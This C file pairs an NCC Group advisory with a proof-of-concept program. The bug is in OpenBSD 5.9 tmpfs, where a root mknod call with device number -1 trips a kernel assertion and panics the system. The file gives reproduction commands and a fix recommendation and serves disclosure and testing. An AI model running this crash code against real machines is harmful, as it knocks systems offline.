/*
 * tmpfs_mknod_panic.c:
 *    Demonstrate a panic in tmpfs when performing mknod
 *
 * gcc -g tmpfs_mknod_panic.c -o tmpfs_mknod_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
Root can panic kernel with mknod on a tmpfs filesystem

Impact: 
Root can panic the kernel.

Description:
When performing a mknod system call on a tmpfs filesystem,
the tmpfs_alloc_node() function asserts that the rdev parameter
is not VNOVAL (-1):

    /* Type-specific initialization. */
    switch (nnode->tn_type) {
    case VBLK:
    case VCHR:
        /* Character/block special device. */
        KASSERT(rdev != VNOVAL);
        nnode->tn_spec.tn_dev.tn_rdev = rdev;
        break;

However, the value or rdev is never validated previous to this.
Users that can perform mknod() calls on a tmpfs (i.e. root)
can trigger this condition to panic the kernel.

Reproduction:
Compile the attached test program and execute it as root with a path
to a non-existance filename on a tmpfs filesystem:

  # mount -o rw,-s16M -t tmpfs swap /mnt
  # gcc -g tmpfs_mknod_panic.c -o tmpfs_mknod_panic
  # ./tmpfs_mknod_panic /mnt/boom

This should cause the kernel to panic in tmpfs_alloc_node().
NCC Group was able to reproduce this issue on OpenBSD 5.9 release 
running amd64.

Recommendation:
Validate the device number vap->va_rdev in tmpfs_mknod() and return
an error if it is VNOVAL (-1).

Reported: 2016-07-05
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/vfs_syscalls.c.diff?r1=1.260&r2=1.261
#endif // BUG_WRITEUP ---------------------------------------------------

#include <stdio.h>
#include <sys/stat.h>

int
main(int argc, char **argv)
{
    char *fn;
    int i, x;

    for(i = 1; i < argc; i++) {
        fn = argv[i];
        x = mknod(fn, S_IFBLK | 0666, -1);
        if(x == -1) 
            perror(fn);
    }
    printf("nothing happened!\n");
    return 0;
}

